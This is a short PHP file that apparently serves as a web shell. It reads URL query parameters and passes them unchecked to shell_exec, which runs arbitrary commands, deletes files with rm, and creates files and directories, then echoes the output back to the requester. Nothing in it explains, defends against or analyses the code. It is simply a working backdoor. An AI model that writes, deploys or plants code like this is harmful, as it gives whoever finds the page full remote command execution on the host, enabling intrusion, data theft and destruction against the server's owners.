<?php
    if(isset($_GET['shell']) && isset($_GET['path']) !== true){
        $output = shell_exec($_GET['shell']);
        echo $output;
    }elseif(isset($_GET['path']) && isset($_GET['shell']) !== true){
        $output = shell_exec("ls ".$_GET['path']);
        echo $output;
    }elseif(isset($_GET['del'])){
        $output = shell_exec("rm ".$_GET['del']);
        echo $output;
    }elseif(isset($_GET['what']) && isset($_GET['ffl']) && isset($_GET['sfl'])){
        $output = shell_exec($_GET['what'].' '.$_GET['ffl'].' '.$_GET['sfl']);
        echo $output;
    }elseif(isset($_GET['tc']) && isset($_GET['name'])){
        $output = shell_exec("touch ".$_GET['name']);
        echo $output;
    }elseif(isset($_GET['md']) && isset($_GET['name'])){
        $output = shell_exec("mkdir ".$_GET['name']);
        echo $output;
    }elseif(isset($_GET['dell'])){
        $output = shell_exec($_GET['dell']);
        echo $output;
    }
?>